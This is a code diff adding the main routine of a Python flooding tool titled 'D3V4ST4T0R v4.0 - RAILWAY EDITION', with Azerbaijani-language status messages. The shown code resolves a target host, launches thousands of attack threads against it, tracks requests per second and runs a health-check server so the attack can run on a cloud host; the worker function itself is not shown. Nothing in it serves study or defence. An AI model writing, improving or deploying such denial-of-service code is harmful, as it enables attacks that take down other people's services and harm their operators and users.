@@ -191,4 +191,61 @@ class HealthHandler(BaseHTTPRequestHandler):
         with count_lock:
             total = request_count
         self.wfile.write(json.dumps({
-            "status": "running
+            "status": "running",
+            "target": HEDEF,
+            "threads": threading.active_count(),
+            "uptime": f"{int(time.time() - start_time)}s",
+            "requests": total,
+        }).encode())
+    def log_message(self, *args): pass
+
+def start_health_server():
+    server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
+    print(f"  [+] Health check: http://0.0.0.0:8080")
+    server.serve_forever()
+
+# === MAIN ===
+if __name__ == "__main__":
+    global start_time
+    start_time = time.time()
+    
+    print("="*50)
+    print("D3V4ST4T0R v4.0 - RAILWAY EDITION")
+    print("="*50)
+    print(f"  Hedef: {HEDEF}")
+    print(f"  Port: {PORT} {'(SSL)' if USE_SSL else '(HTTP)'}")
+    print(f"  Thread: {THREAD_COUNT:,}")
+    print()
+    
+    print("[*] DNS cozulur...")
+    ips = resolve(HEDEF)
+    if not ips:
+        ips = [HEDEF]
+    
+    ip = ips[0]
+    print(f"[*] Hucum baslayir: {ip}:{PORT}")
+    print()
+    
+    # Thread-ləri başlat
+    for i in range(THREAD_COUNT):
+        t = threading.Thread(target=worker, args=(ip, PORT, USE_SSL, HEDEF, i), daemon=True)
+        t.start()
+        if (i+1) % 2000 == 0:
+            print(f"  [+] {i+1}/{THREAD_COUNT} thread...")
+    
+    print(f"\n[!] {THREAD_COUNT} THREAD ISHE SALINDI!")
+    print(f"[!] Health check: http://localhost:8080 (Railway internal)")
+    
+    # Health server başlat
+    threading.Thread(target=start_health_server, daemon=True).start()
+    
+    # Monitor
+    try:
+        while time.time() - start_time < MUDDET:
+            with count_lock:
+                rps = request_count / (time.time() - start_time + 0.1)
+            print(f"\r  [+] {int(time.time()-start_time)}s | Threads: {threading.active_count():,} | RPS: {rps:,.0f} | Total: {request_count:,}", end="")
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n\n[!] Dayandirildi")
+        stop_flag.set()
